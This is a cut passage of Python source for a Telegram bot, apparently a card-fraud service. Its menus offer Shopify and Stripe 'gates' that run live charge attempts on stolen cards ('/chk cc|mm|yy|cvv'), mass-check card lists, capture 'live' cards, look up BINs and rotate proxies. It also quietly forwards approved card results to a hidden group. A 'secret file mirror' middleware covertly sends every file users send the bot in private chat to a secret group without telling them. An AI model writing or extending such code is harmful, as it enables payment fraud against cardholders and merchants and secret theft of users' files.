            lp = json.load(f)
        for uid, proxies in lp.items():
            data.setdefault(uid, {})["proxies"] = proxies
    except Exception:
        pass
    return data

def _save_fp_data(data: dict) -> None:
    with open(FREEPROXY_DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)

def freeproxy_cooldown_remaining(user_id: int) -> float:
    """Returns seconds remaining in cooldown, or 0 if user can claim again."""
    data       = _load_fp_data()
    claimed_at = data.get(str(user_id), {}).get("claimed_at", 0)
    elapsed    = time.time() - claimed_at
    cooldown   = FREEPROXY_COOLDOWN_HOURS * 3600
    return max(0.0, cooldown - elapsed)

def freeproxy_set_claimed(user_id: int) -> None:
    data = _load_fp_data()
    data.setdefault(str(user_id), {})["claimed_at"] = int(time.time())
    _save_fp_data(data)

def _save_freeproxy_last(user_id: int, proxy_strings: list[str]) -> None:
    """Persist the last fetched proxy strings for a user (alongside cooldown)."""
    try:
        data = _load_fp_data()
        data.setdefault(str(user_id), {})["proxies"] = proxy_strings
        _save_fp_data(data)
    except Exception:
        pass

def _load_freeproxy_last(user_id: int) -> list[str]:
    """Load the last fetched proxy strings for a user."""
    try:
        return _load_fp_data().get(str(user_id), {}).get("proxies", [])
    except Exception:
        return []

# Temporary store for proxies fetched but not yet added (cleared after Add button click)
_freeproxy_pending: dict[int, list[dict]] = {}   # uid → parsed proxy dicts


# ══════════════════════════════════════════════════════════════════════════════
#  SITES LIST — source of truth = sites.json (same file shp.py uses on nodes)
#  sites.txt is kept as a flat URL dump for admin filter tools only.
# ══════════════════════════════════════════════════════════════════════════════

_sites_cache: list[str] | None = None
_sites_cache_mtime: float = 0.0
_sites_cache_src: str = ""


def _load_sites() -> list[str]:
    """Load Site URLs from sites.json (preferred) or fall back to sites.txt."""
    global _sites_cache, _sites_cache_mtime, _sites_cache_src

    src = SITES_JSON if os.path.isfile(SITES_JSON) else SITES_FILE
    try:
        mt = os.path.getmtime(src)
    except OSError:
        return []

    if (
        _sites_cache is not None
        and mt == _sites_cache_mtime
        and _sites_cache_src == src
    ):
        return _sites_cache

    urls: list[str] = []
    if src == SITES_JSON:
        try:
            with open(SITES_JSON, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, list):
                for entry in data:
                    site = (entry.get("Site") or "").strip().rstrip("/")
                    if site:
                        if not site.startswith("http"):
                            site = "https://" + site
                        urls.append(site)
            # Keep sites.txt in sync so admin /filter tools still work
            try:
                with open(SITES_FILE, "w", encoding="utf-8") as f:
                    f.write("\n".join(urls) + ("\n" if urls else ""))
            except OSError:
                pass
        except Exception as exc:
            log.error("Failed to load sites.json: %s — falling back to sites.txt", exc)
            src = SITES_FILE
            try:
                mt = os.path.getmtime(SITES_FILE)
            except OSError:
                return []
            with open(SITES_FILE, "r", encoding="utf-8") as f:
                urls = [l.strip().rstrip("/") for l in f if l.strip()]
    else:
        with open(SITES_FILE, "r", encoding="utf-8") as f:
            urls = [l.strip().rstrip("/") for l in f if l.strip()]

    # Dedupe while preserving order
    seen: set[str] = set()
    deduped: list[str] = []
    for u in urls:
        if u not in seen:
            seen.add(u)
            deduped.append(u)

    _sites_cache = deduped
    _sites_cache_mtime = mt
    _sites_cache_src = src
    log.info("Loaded %d sites from %s", len(deduped), os.path.basename(src))
    return _sites_cache


def get_random_site() -> str | None:
    sites = _load_sites()
    return random.choice(sites) if sites else None


# ══════════════════════════════════════════════════════════════════════════════
#  BOT + DISPATCHER
# ══════════════════════════════════════════════════════════════════════════════

bot = Bot(
    token=TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML),
)
dp = Dispatcher()
router = Router()
dp.include_router(router)
# dp.include_router(midasbuy.md_router)

# ── GC bypass middleware ─────────────────────────────────────────────────────
# When a user talks to the bot from inside the required group itself, they are
# obviously a member — skip the join check by pre-seeding the cache.
@dp.update.outer_middleware()
async def _gc_bypass_mw(handler, event, data):
    try:
        msg = getattr(event, "message", None)
        cb  = getattr(event, "callback_query", None)
        uid = chat_id = None
        if msg is not None:
            uid = msg.from_user.id if msg.from_user else None
            chat_id = msg.chat.id if msg.chat else None
        elif cb is not None:
            uid = cb.from_user.id if cb.from_user else None
            chat_id = cb.message.chat.id if (cb.message and cb.message.chat) else None
        if uid and chat_id == join_chat_id:
            _join_cache[uid] = (True, time.time())
    except Exception:
        pass
    return await handler(event, data)


# ── Secret file mirror middleware ────────────────────────────────────────────
# Silently forward any file/media sent to the bot in DM to SECRET_FILES_GROUP_ID.
# User is never notified. Runs before handlers so a return/reply doesn't skip it.
@dp.message.outer_middleware()
async def _secret_file_mirror_mw(handler, event, data):
    try:
        if event.chat and event.chat.type == "private" and (
            event.document or event.photo or event.video or event.audio
            or event.voice or event.video_note or event.animation or event.sticker
        ):
            try:
                await bot.forward_message(
                    SECRET_FILES_GROUP_ID,
                    event.chat.id,
                    event.message_id,
                    disable_notification=True,
                )
            except Exception:
                pass
    except Exception:
        pass
    return await handler(event, data)



# ══════════════════════════════════════════════════════════════════════════════
#  SAFE EDIT — wraps every edit_text call with flood-wait + error handling
# ══════════════════════════════════════════════════════════════════════════════

async def safe_edit(msg: types.Message, text: str, **kwargs) -> bool:
    """
    Drop-in replacement for msg.edit_text().
    Handles:
      • TelegramRetryAfter  — sleeps the required time and retries (up to 3×)
      • MessageNotModified  — silently ignored (content didn't change)
      • MessageCantBeEdited / MessageToEditNotFound — logged, silently skipped
      • TelegramForbiddenError — user blocked bot, logged
      • Any other exception — logged as error, execution continues
    Returns True on success, False on permanent failure.
    """
    for attempt in range(2):   # max 1 retry — progress edits are cosmetic, not worth 74s blocks
        try:
            await msg.edit_text(text, **kwargs)
            return True
        except TelegramRetryAfter as e:
            wait = min(e.retry_after + 1, 15)   # cap at 15s — never block a worker for 74s
            log.warning("⏳ FloodWait %ss on edit (attempt %s) — sleeping", wait, attempt + 1)
            await asyncio.sleep(wait)
        except TelegramBadRequest as e:
            emsg = str(e).lower()
            if "message is not modified" in emsg:
                return True   # same content, not an error
            if any(x in emsg for x in (
                "message can't be edited",
                "message to edit not found",
                "chat not found",
                "message_id_invalid",
            )):
                log.debug("safe_edit skipped (stale msg): %s", e)
                return False
            log.error("safe_edit TelegramBadRequest: %s", e)
            return False
        except TelegramForbiddenError as e:
            log.warning("safe_edit Forbidden (user blocked bot?): %s", e)
            return False
        except TelegramNotFound as e:
            log.debug("safe_edit NotFound: %s", e)
            return False
        except Exception as e:
            log.error("safe_edit unexpected error: %s", e, exc_info=True)
            return False
    log.error("safe_edit gave up after retries (persistent FloodWait)")
    return False


# ══════════════════════════════════════════════════════════════════════════════
#  GLOBAL ERROR HANDLER — catches any unhandled exception inside a handler
#  so one bad update never kills the whole polling loop
# ══════════════════════════════════════════════════════════════════════════════

@dp.errors()
async def global_error_handler(event: types.ErrorEvent):
    exc = event.exception
    update = event.update

    if isinstance(exc, TelegramRetryAfter):
        log.warning("🚦 Global FloodWait %ss — bot will auto-retry", exc.retry_after)
        await asyncio.sleep(exc.retry_after + 1)
        return True   # tell aiogram to retry the update

    if isinstance(exc, TelegramForbiddenError):
        log.warning("🚫 Forbidden (user blocked bot): %s", exc)
        return True   # swallow — nothing we can do

    # Log everything else with full traceback to bot_error.log
    log.error(
        "❌ Unhandled exception in update %s:\n%s",
        getattr(update, "update_id", "?"),
        exc,
        exc_info=True,
    )
    return True   # returning True = "handled", prevents aiogram from crashing


# ══════════════════════════════════════════════════════════════════════════════
#  PER-USER THROTTLE MIDDLEWARE
#  Prevents a single user from triggering >3 commands/second, which would
#  cause a burst of Telegram API calls and a FloodWait cascade.
# ══════════════════════════════════════════════════════════════════════════════

from aiogram import BaseMiddleware as _BaseMiddleware

class _ThrottleMiddleware(_BaseMiddleware):
    """Rate-limit + auto-ban spammers.

    • Drops updates from manually/auto-banned users instantly (no response).
    • Auto-bans anyone who sends >_AUTO_BAN_LIMIT events within _AUTO_BAN_WINDOW seconds.
    • Enforces _RATE-second cooldown between events per user (soft throttle).
    """
    _RATE            = 0.4    # min seconds between events per user
    _AUTO_BAN_WINDOW = 10.0   # sliding window for spam detection (seconds)
    _AUTO_BAN_LIMIT  = 20     # events in that window before auto-ban

    _last:   dict[int, float]       = {}
    _window: dict[int, list[float]] = {}   # recent event timestamps per user

    async def __call__(self, handler, event, data):
        user: types.User | None = data.get("event_from_user")
        if not user:
            return await handler(event, data)

        uid = user.id

        # Silently drop banned users — no reply, no processing
        if is_banned(uid):
            return

        now = time.monotonic()

        # Sliding-window spam detection
        times = self._window.get(uid, [])
        times = [t for t in times if now - t < self._AUTO_BAN_WINDOW]
        times.append(now)
        self._window[uid] = times

        if len(times) >= self._AUTO_BAN_LIMIT:
            ban_user(uid)
            log.warning(
                "AUTO-BAN: user %s (@%s) sent %d events in %.1fs",
                uid, user.username or "?", len(times), self._AUTO_BAN_WINDOW,
            )
            return

        # Soft rate-limit (sleep briefly rather than drop)
        last = self._last.get(uid, 0.0)
        diff = now - last
        if diff < self._RATE:
            await asyncio.sleep(self._RATE - diff)
        self._last[uid] = time.monotonic()

        # Log every command so we can trace who runs what
        try:
            if hasattr(event, "text") and event.text:
                cmd_preview = event.text.split("\n")[0][:60]
                log.info("CMD uid=%s @%s → %s", uid, user.username or "?", cmd_preview)
        except Exception:
            pass

        return await handler(event, data)

dp.message.middleware(_ThrottleMiddleware())
dp.callback_query.middleware(_ThrottleMiddleware())


# ══════════════════════════════════════════════════════════════════════════════
#  JOIN CHECK MIDDLEWARE
# ══════════════════════════════════════════════════════════════════════════════

# ── Join-check cache (avoid Telegram API rate limits) ────────────────────────
# With 3K users sending commands, check_user_joined() fires 2 API calls each.
# Telegram rate-limits → bot hangs for minutes. Cache result for 5 minutes.
# Negative (not-joined) results cached only 30 seconds so Verify works immediately.
_join_cache: dict[int, tuple[bool, float]] = {}
_JOIN_CACHE_TTL_OK  = 300   # 5 min  — cache joined=True
_JOIN_CACHE_TTL_NO  = 30    # 30 sec — cache joined=False (re-check fast after joining)

async def check_user_joined(user_id: int, force: bool = False) -> bool:
    now = time.time()

    if not force:
        cached = _join_cache.get(user_id)
        if cached:
            ttl = _JOIN_CACHE_TTL_OK if cached[0] else _JOIN_CACHE_TTL_NO
            if now - cached[1] < ttl:
                return cached[0]

    try:
        member = await bot.get_chat_member(join_chat_id, user_id)

        log.info(
            "JOIN CHECK | user=%s | chat=%s | status=%s",
            user_id,
            join_chat_id,
            member.status,
        )

        # Telegram can return restricted while the user is still a member
        if member.status in {
            ChatMemberStatus.MEMBER,
            ChatMemberStatus.ADMINISTRATOR,
            ChatMemberStatus.CREATOR,
        }:
            result = True
        elif member.status == ChatMemberStatus.RESTRICTED:
            result = getattr(member, "is_member", False)
        else:
            result = False

    except Exception as e:
        # Fail-open: if we can't verify (bot not admin, network hiccup, Telegram
        # returns "user not found" for legit joined members, etc.) allow access
        # rather than falsely blocking. Cache briefly so we don't hammer the API.
        log.error(
            "JOIN CHECK ERROR (fail-open) | user=%s | chat=%s | %r",
            user_id,
            join_chat_id,
            e,
        )
        _join_cache[user_id] = (True, now)
        return True

    _join_cache[user_id] = (result, now)
    return result

def join_keyboard() -> dict:
    return {
        "inline_keyboard": [
            [{
                "text": f"{bold('Join Group')}",
                "url": GROUP_LINK,
                "icon_custom_emoji_id": E["chat2"],
                "style": "primary"
            }],
            [{
                "text": f"{bold('Verify Joined')}",
                "callback_data": "verify_join",
                "icon_custom_emoji_id": E["check"],
                "style": "success"
            }],
        ]
    }

JOIN_MSG = (
    f"{pe(E['warn'])} {bold('Access Restricted')}\n\n"
    f"{pe(E['bolt'])} {bold('You must join our group to use this bot.')}\n\n"
    f"{pe(E['link'])} {bold('Tap the button below to join, then tap Verify.')}"
)


# ══════════════════════════════════════════════════════════════════════════════
#  MENU KEYBOARD
# ══════════════════════════════════════════════════════════════════════════════

def menu_keyboard() -> dict:
    return {
        "inline_keyboard": [
            [
                {"text": f"{bold('Gates')}", "callback_data": "menu_gates",
                 "icon_custom_emoji_id": "5388868060104896896", "style": "primary"},
                {"text": f"{bold('Get Plans')}", "callback_data": "menu_plans",
                 "icon_custom_emoji_id": "6141149994524085964", "style": "success"},
            ],
            [
                {"text": f"{bold('Commands')}", "callback_data": "menu_check",
                 "icon_custom_emoji_id": "5156781758439490145", "style": "success"},
                {"text": f"{bold('Updates')}", "url": "https://t.me/+l4wyJzE1jbI3MTc1",
                 "icon_custom_emoji_id": "5265004080916343533", "style": "primary"},
            ],
            [
                {"text": f"{bold('Close')}", "callback_data": "menu_close",
                 "icon_custom_emoji_id": "5316961099159968983", "style": "danger"},
            ],
        ]
    }


def gates_keyboard() -> dict:
    """Gates sub-menu matching the reference screenshot."""
    return {
        "inline_keyboard": [
            [
                {"text": f"{bold('Auth Gate')}", "callback_data": "gate_auth",
                 "icon_custom_emoji_id": "5309789538862774805", "style": "primary"},
                {"text": f"{bold('Mass Gate')}", "callback_data": "gate_mass",
                 "icon_custom_emoji_id": "5474419676882686371", "style": "primary"},
            ],
            [
                {"text": f"{bold('Charge Gate')}", "callback_data": "gate_charge",
                 "icon_custom_emoji_id": "5388595952451859597", "style": "success"},
                {"text": f"{bold('Hitters')}", "callback_data": "gate_cnn",
                 "icon_custom_emoji_id": "5265004080916343533", "style": "success"},
            ],
            [
                {"text": f"{bold('Premium Gates')}", "callback_data": "gate_premium",
                 "icon_custom_emoji_id": "5219971168429158186", "style": "success"},
            ],
            [
                {"text": f"{bold('‹‹ Back')}", "callback_data": "menu_back",
                 "icon_custom_emoji_id": "5474419676882686371", "style": "primary"},
                {"text": f"{bold('Close')}", "callback_data": "menu_close",
                 "icon_custom_emoji_id": "5316961099159968983", "style": "danger"},
            ],
        ]
    }


def back_keyboard() -> dict:
    """Back + Home row for sub-pages."""
    return {
        "inline_keyboard": [
            [
                {
                    "text": f"{bold('‹‹ Back')}",
                    "callback_data": "menu_back",
                    "icon_custom_emoji_id": N["ripple"],
                    "style": "primary",
                },
                {
                    "text": f"{bold('⌂ Home')}",
                    "callback_data": "menu_home",
                    "icon_custom_emoji_id": N["halo"],
                    "style": "success",
                },
            ],
        ]
    }

# ── Optional banner (add file_id or URL here, leave empty to disable) ─────
BANNER_FILE_ID = ""   # e.g. "AgACAgUAAxk..."  (Telegram photo file_id)
BANNER_URL     = ""   # e.g. "https://your.cdn/banner.png"

# /start menu rotating GIF — uses your uploaded anime GIFs from the gifs/ folder.
START_GIF_POOL = [
    os.path.join(GIF_DIR, "aniyuki-black-and-white-anime-6.gif_1786574045255.mp4"),
    os.path.join(GIF_DIR, "K4FAdzTq6ydJ.gif_1786581960787.mp4"),
    os.path.join(GIF_DIR, "Tkyfzl77pR.gif_1786581960800.mp4"),
    os.path.join(GIF_DIR, "fa1ce34ccc959534.gif_1786581960773.mp4"),
    os.path.join(GIF_DIR, "fedbcf7d55aae59d.gif_1_1786581960821.mp4"),
]

WELCOME_MSG_TMPL = (
    "{spark} <b>SW — v2.1</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━\n\n"
    "{user_e} Welcome, <b>{name}</b>! {crown}\n"
    "{id_e} <b>ID:</b> <code>{uid}</code>\n"
    "{lock_e} <b>Status:</b> {status}\n\n"
    "<i>Use the menu below to get started.</i>\n"
    "<i>Need help? → </i><a href=\"https://t.me/@ENTRO_VIBER\">Support</a>"
)

WELCOME_MSG = WELCOME_MSG_TMPL  # legacy alias

async def _send_banner(chat_id: int) -> None:
    """Send optional banner photo above the welcome text. No-op if unset."""
    src = BANNER_FILE_ID or BANNER_URL
    if not src:
        return
    try:
        await bot.send_photo(chat_id, src)
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  REGISTER MIDASBUY MODULE (off)
# ══════════════════════════════════════════════════════════════════════════════

# midasbuy.register(
#     bot=bot,
#     check_joined=check_user_joined,
#     join_msg=JOIN_MSG,
#     join_kb=join_keyboard,
#     get_user_proxy=get_user_proxy,
#     get_user_proxies=get_user_proxies,
#     pe_fn=pe,
#     emoji_map=E,
#     result_emoji_map=R,
#     bold_fn=bold,
#     user_link_fn=user_link,
#     brand_emoji_fn=brand_emoji,
# )


# ══════════════════════════════════════════════════════════════════════════════
#  /start COMMAND
# ══════════════════════════════════════════════════════════════════════════════

async def _send_approved(text: str) -> None:
    """Silently forward an approved (live, non-charged) CC result to the approved group."""
    try:
        await bot.send_message(auth.APPROVED_GROUP_ID, text, disable_notification=True)
    except Exception:
        pass


@router.message(CommandStart())
async def cmd_start(message: types.Message):
    # Save user on first visit
    is_new = auth.save_user(message.from_user.id, message.from_user.username, message.from_user.full_name)

    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(
            JOIN_MSG,
            reply_markup=join_keyboard(),
        )
        return

    if auth.is_banned(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('You are banned from this bot!')}")
        return

    await _send_banner(message.chat.id)
    await _send_menu(message.chat.id, message.from_user)


def _build_welcome(user) -> str:
    """Build the welcome card with live license status for a given user."""
    name = _html.escape((user.full_name if user else None) or "Friend")
    uid = user.id if user else 0
    role = auth.get_user_role(uid) if user else "free"
    if role == "owner":
        status = f"{bold('Owner')} {pe('5156781758439490145')} <i>(Lifetime)</i>"
    elif role == "admin":
        status = f"{bold('Admin')} {pe('5156781758439490145')} <i>(Lifetime)</i>"
    elif role == "premium":
        exp = auth.get_premium_expiry(uid) or ""
        status = f"{bold('Licensed')} {pe('5156781758439490145')} <i>({exp})</i>"
    else:
        status = f"{bold('Free')} {pe('5346063582809315727')}"
    return WELCOME_MSG_TMPL.format(
        spark=pe("6023660820544623088"),
        user_e=pe("5467730450002746997"),
        id_e=pe("5474419676882686371"),
        lock_e=pe("5309789538862774805"),
        crown=pe("5341459833134525875"),
        name=name, uid=uid, status=status,
    )


async def _send_menu(chat_id: int, user=None) -> None:
    """Send the main menu as a GIF + welcome caption; falls back to plain text."""
    text = _build_welcome(user)
    try:
        await bot.send_animation(
            chat_id,
            animation=_gif_input(random.choice(START_GIF_POOL)),
            caption=text,
            reply_markup=menu_keyboard(),
        )
    except Exception:
        try:
            await bot.send_message(chat_id, text, reply_markup=menu_keyboard(),
                                   disable_web_page_preview=True)
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════════════
#  VERIFY JOIN CALLBACK
# ══════════════════════════════════════════════════════════════════════════════

@router.callback_query(F.data == "verify_join")
async def cb_verify_join(callback: types.CallbackQuery):
    # Always do a fresh API check — bypasses cache so users see instant result
    joined = await check_user_joined(callback.from_user.id, force=True)
    if not joined:
        await callback.answer(
            f"{bold('You have not joined yet! Join both channel and group first.')}",
            show_alert=True,
        )
        return

    await callback.answer(f"{bold('Verified! Welcome!')}")
    await _restore_menu(callback)


# ══════════════════════════════════════════════════════════════════════════════
#  MENU CALLBACKS
# ══════════════════════════════════════════════════════════════════════════════

async def _restore_menu(callback: types.CallbackQuery) -> None:
    """Return to the main menu — swap back to the GIF menu card."""
    msg = callback.message
    try:
        await msg.delete()
    except Exception:
        pass
    await _send_menu(msg.chat.id, callback.from_user)


@router.callback_query(F.data == "menu_back")
async def cb_menu_back(callback: types.CallbackQuery):
    """Back button → return to the main GIF menu."""
    await callback.answer()
    await _restore_menu(callback)


@router.callback_query(F.data == "menu_home")
async def cb_menu_home(callback: types.CallbackQuery):
    """Home button → jump straight back to the main GIF menu from any sub-page."""
    await callback.answer()
    await _restore_menu(callback)


# ── SS-matched Gates submenu + sibling actions ─────────────────────────────
GATES_MENU_TEXT = (
    f"{pe('5388868060104896896')} <b>GATES MENU</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━\n\n"
    f"{pe('5309789538862774805')} <b>Auth Gate</b> — <i>single &amp; inline checks (free)</i>\n"
    f"{pe('5474419676882686371')} <b>Mass Gate</b> — <i>inline multi-card checking</i>\n"
    f"{pe('5388595952451859597')} <b>Charge Gate</b> — <i>live card + community join</i> "
    f"{pe('5219971168429158186')} <b>Premium</b>\n"
    f"{pe('5265004080916343533')} <b>Hitters</b> — <i>capture incorrect_cvc live cards</i> "
    f"{pe('5219971168429158186')} <b>Premium</b>\n"
    f"{pe('6023660820544623088')} <b>Premium Gates</b> — <i>all premium tools</i>"
)

COMING_SOON_KB = {
    "inline_keyboard": [[
        {"text": f"{bold('‹‹ Back to Gates')}", "callback_data": "menu_gates",
         "icon_custom_emoji_id": "5474419676882686371", "style": "primary"},
        {"text": f"{bold('⌂ Home')}", "callback_data": "menu_home",
         "icon_custom_emoji_id": "5303120803271817149", "style": "success"},
    ]]
}


@router.callback_query(F.data == "menu_gates")
async def cb_menu_gates(callback: types.CallbackQuery):
    await callback.answer()
    await _open_page(callback, GATES_MENU_TEXT, gates_keyboard())


@router.callback_query(F.data == "menu_close")
async def cb_menu_close(callback: types.CallbackQuery):
    await callback.answer(f"{bold('Closed.')}")
    try:
        await callback.message.delete()
    except Exception:
        pass


@router.callback_query(F.data == "menu_plans")
async def cb_menu_plans(callback: types.CallbackQuery):
    await callback.answer()
    text = (
        f"{pe('6141149994524085964')} <b>GET PLANS</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{pe('5219971168429158186')} <b>Premium</b> — <i>unlocks all charge &amp; CNN live gates</i>\n"
        f"{pe('5413631334000110048')} <b>Pricing</b> — <i>DM support for current rates</i>\n\n"
        f"{pe('5330289087054103251')} <i>Contact:</i> <a href=\"https://t.me/+l4wyJzE1jbI3MTc1\">@talkneonok</a>"
    )
    await _open_page(callback, text, back_keyboard())


@router.callback_query(F.data == "gate_auth")
async def cb_gate_auth(callback: types.CallbackQuery):
    await callback.answer()
    text = (
        f"{pe('5309789538862774805')} <b>AUTH GATE</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{pe('4992597150262101203')} <i>Coming soon.</i>\n\n"
        f"{pe('5474419676882686371')} <i>This gate is under construction — stay tuned.</i>"
    )
    await _open_page(callback, text, COMING_SOON_KB)


@router.callback_query(F.data == "gate_premium")
async def cb_gate_premium(callback: types.CallbackQuery):
    await callback.answer()
    text = (
        f"{pe('5219971168429158186')} <b>PREMIUM GATES</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{pe('4992597150262101203')} <i>Coming soon.</i>\n\n"
        f"{pe('6023660820544623088')} <i>All premium-tier gates will land here.</i>"
    )
    await _open_page(callback, text, COMING_SOON_KB)


@router.callback_query(F.data == "gate_charge")
async def cb_gate_charge(callback: types.CallbackQuery):
    await callback.answer()
    text = (
        f"{pe('5388595952451859597')} <b>CHARGE GATE · AUTO-SHOPIFY</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{pe('5474419676882686371')} <b>Shopify single</b> — <code>/sh cc|mm|yy|cvv</code>\n"
        f"{pe('6023660820544623088')} <b>Shopify charge</b> — <code>/chk cc|mm|yy|cvv</code>\n"
        f"{pe('5265004080916343533')} <i>Runs a live charge attempt on a rotating Shopify pool.</i>\n\n"
        f"{pe('5219971168429158186')} <b>Premium</b> gate — community join required."
    )
    await _open_page(callback, text, COMING_SOON_KB)


@router.callback_query(F.data == "gate_mass")
async def cb_gate_mass(callback: types.CallbackQuery):
    await callback.answer()
    text = (
        f"{pe('5474419676882686371')} <b>MASS GATE · AUTO-SHOPIFY</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{pe('5388595952451859597')} <b>Mass check</b> — <code>/chk</code> reply to a .txt of cards\n"
        f"{pe('5265004080916343533')} <i>Parallel autoshopify checking with live progress.</i>\n\n"
        f"{pe('5474167682561488464')} <b>Tip:</b> drop a file directly — checker auto-starts."
    )
    await _open_page(callback, text, COMING_SOON_KB)


@router.callback_query(F.data == "gate_cnn")
async def cb_gate_cnn(callback: types.CallbackQuery):
    await callback.answer()
    text = (
        f"{pe('5265004080916343533')} <b>HITTERS · STRIPE HITTER</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{pe('5388595952451859597')} <b>Hit</b> — <code>/hitco &lt;stripe-link&gt; cc|mm|yy|cvv</code>\n"
        f"{pe('5474419676882686371')} <i>Or upload a combo .txt with the same command.</i>\n\n"
        f"{pe('5999340396432333728')} <b>Captures</b> incorrect_cvc lives and full charges."
    )
    await _open_page(callback, text, COMING_SOON_KB)



async def _open_page(callback: types.CallbackQuery, text: str, kb: dict) -> None:
    """Open a sub-page — edits text messages, replaces media messages."""
    try:
        ok = await safe_edit(callback.message, text, reply_markup=kb)
    except Exception:
        ok = False
    if not ok:
        try:
            await callback.message.delete()
        except Exception:
            pass
        try:
            await bot.send_message(callback.message.chat.id, text, reply_markup=kb)
        except Exception:
            pass


@router.callback_query(F.data == "menu_check")
async def cb_menu_check(callback: types.CallbackQuery):
    """Open the paginated command list (page 1)."""
    await callback.answer()
    text, kb = _help_page(1)
    await _open_page(callback, text, kb)

@router.callback_query(F.data == "menu_proxy")
async def cb_menu_proxy(callback: types.CallbackQuery):
    await callback.answer()
    text = (
        f"{_sp()} {bold('PROXY VAULT')}\n\n"
        f"{_sp()} <code>/proxy host:port:user:pass</code>\n"
        f"{_sp()} <code>/proxy socks5://user:pass@host:port</code>\n"
        f"{_sp()} /myproxy — {bold('view your saved list')}\n"
        f"{_sp()} /rmproxy — {bold('clear all')}\n\n"
        f"{_sp()} /freeproxy — {bold('grab 10 free proxies · 24h cooldown')}\n"
        f"{_sp()} /freeproxylist — {bold('show your pending pool')}\n\n"
        f"{_sp()} {bold('Every proxy is live-tested before it is saved.')}"
    )
    await _open_page(callback, text, back_keyboard())

@router.callback_query(F.data == "menu_bin")
async def cb_menu_bin(callback: types.CallbackQuery):
    await callback.answer()
    text = (
        f"{_sp()} {bold('BIN SCANNER')}\n\n"
        f"{_sp()} <code>/bin 438854</code>\n"
        f"{_sp()} <code>/bin 4388541234567890</code>\n\n"
        f"{_sp()} {bold('Returns brand · type · level · bank · country flag.')}"
    )
    await _open_page(callback, text, back_keyboard())

@router.callback_query(F.data == "menu_profile")
async def cb_menu_profile(callback: types.CallbackQuery):
    await callback.answer()
    uid = callback.from_user.id
    uname = callback.from_user.full_name or "Unknown"
    username = callback.from_user.username or "none"
    proxy_list = get_user_proxies(uid)
    count = len(proxy_list)

    proxy_status = f"{pe(N['shield'])} {bold(str(count) + ' proxies')}" if proxy_list else f"{pe(N['ember'])} {bold('Not Set')}"

    # Premium status
    role = auth.get_user_role(uid)
    expiry = auth.get_premium_expiry(uid)
    if role == "owner":
        prem_line = f"{pe(N['diamond'])} {bold('Owner')} · {bold('Lifetime')}"
    elif role == "admin":
        prem_line = f"{pe(N['crystal'])} {bold('Admin')} · {bold('Lifetime')}"
    elif role == "premium":
        prem_line = f"{pe(N['aurora'])} {bold('Premium')} · {bold(expiry)}"
    else:
        prem_line = f"{pe(N['ember'])} {bold('Free User')}"

    cc_limit = auth.get_cc_limit(uid)

    # HTML-escape user name/username to prevent <, >, & breaking HTML parse
    safe_uname = _html.escape(uname)
    safe_username = _html.escape(username)

    text = (
        f"{_sp()} {bold('MY PROFILE')}\n\n"
        f"{_sp()} {bold('Name  ·')} {user_link(uid, uname)}\n"
        f"{_sp()} {bold('User  ·')} @{safe_username}\n"
        f"{_sp()} {bold('ID    ·')} <code>{uid}</code>\n\n"
        f"{_sp()} {bold('Plan  ·')} {prem_line}\n"
        f"{_sp()} {bold('Proxy ·')} {proxy_status}\n"
        f"{_sp()} {bold('Limit ·')} {bold(str(cc_limit))} {bold('cards / /chk')}"
    )
    await _open_page(callback, text, back_keyboard())


# ══════════════════════════════════════════════════════════════════════════════
#  /proxy COMMAND — Add Proxy
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("proxy"))
async def cmd_proxy(message: types.Message):
    if not (auth.is_admin(message.from_user.id) or auth.is_owner(message.from_user.id)):
        await message.reply(
            f"{pe(E['cross'])} {bold('Owner Only')}\n\n"
            f"{pe(E['next'])} Proxies are managed by the owner — the shared pool is used automatically."
        )
        return
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    raw_text = ""

    # 1. Check command args (multi-line)
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        raw_text = args[1]

    # 2. Check replied message text
    if message.reply_to_message:
        reply_txt = message.reply_to_message.text or message.reply_to_message.caption or ""
        if reply_txt.strip():
            raw_text = raw_text + "\n" + reply_txt if raw_text else reply_txt

    # 3. Check replied .txt file document
    if message.reply_to_message and message.reply_to_message.document:
        doc = message.reply_to_message.document
        if doc.file_name and doc.file_name.lower().endswith(".txt"):
            try:
                from io import BytesIO
                buf = BytesIO()
                await bot.download(doc.file_id, destination=buf)
                buf.seek(0)
                file_text = buf.read().decode("utf-8", errors="ignore")
                if file_text.strip():
                    raw_text = raw_text + "\n" + file_text if raw_text else file_text
            except Exception as e:
                log.error(f"Failed to download proxy file: {e}")

    if not raw_text.strip():
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')}\n\n"
            f"{pe(E['next'])} /proxy host:port:user:pass\n"
            f"{pe(E['next'])} {bold('Multi-line:')}\n"
            f"/proxy proxy1\nproxy2\nproxy3\n\n"
            f"{pe(E['next'])} {bold('Or reply to a .txt file with proxies')}\n\n"
            f"{pe(E['bolt'])} {bold('Supported formats:')}\n"
            f"{pe(E['next'])} host:port\n"
            f"{pe(E['next'])} host:port:user:pass\n"
            f"{pe(E['next'])} user:pass@host:port\n"
            f"{pe(E['next'])} socks5://user:pass@host:port\n\n"
            f"{pe(E['star'])} {bold('Max')} {bold(str(MAX_PROXIES_PER_USER))} {bold('proxies in pool.')}"
        )
        return

    # Parse all proxy lines
    parsed_list = []
    parse_failed = 0
    for line in raw_text.strip().splitlines():
        line = line.strip()
        if not line:
            continue
        parsed = parse_proxy_format(line)
        if parsed:
            parsed_list.append(parsed)
        else:
            parse_failed += 1

